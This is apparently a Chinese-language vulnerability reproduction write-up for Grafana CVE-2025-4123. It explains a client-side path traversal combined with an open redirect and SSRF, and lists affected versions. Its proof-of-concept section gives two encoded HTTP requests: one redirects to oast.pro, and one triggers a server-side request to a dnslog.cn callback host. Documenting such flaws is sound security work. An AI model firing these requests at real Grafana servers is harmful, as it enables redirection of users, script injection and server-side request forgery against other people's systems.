**漏洞介绍**



![img](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640.png)

Grafana是Grafana开源的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。

Grafana存在安全漏洞，该漏洞源于客户端路径遍历和开放重定向结合，可能导致跨站脚本攻击。



注：该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。



![Image](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-1.png)



**0x02影响版本**



1、 8.0.0 ≤ grafana <10.4.18 

2、 11.2.0 ≤ grafana <11.2.9 

3、 11.3.0 ≤ grafana <11.3.6 

4、 11.4.0 ≤ grafana <11.4.4 

5、 11.5.0 ≤ grafana <11.5.4 

6、 11.6.0 ≤ grafana <11.6.1 

7、 12.0.0 ≤ grafana <12.0.1 

![图片](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-2.png)

![Image](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-1.png)



**0x03漏洞复现**

1.访问漏洞环境

![图片](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-3.png)

2.对漏洞进行复现

 **POC** 

漏洞复现

1.开放重定向

```
GET /public/..%2F%5coast.pro%2F%3f%2F..%2F.. HTTP/1.1
Host: 127.0.0.1:8080
```

通过响应判断漏洞存在

![图片](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-4.png)



2.服务端请求伪造

```
GET /render/public/..%252f%255Ckvc1mh.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host: 127.0.0.1:8080
```

   通过dnslog回显判断漏洞存在

![图片](Grafana%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91&%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9ECVE-2025-4123.assets/640-1748914637878-5.png)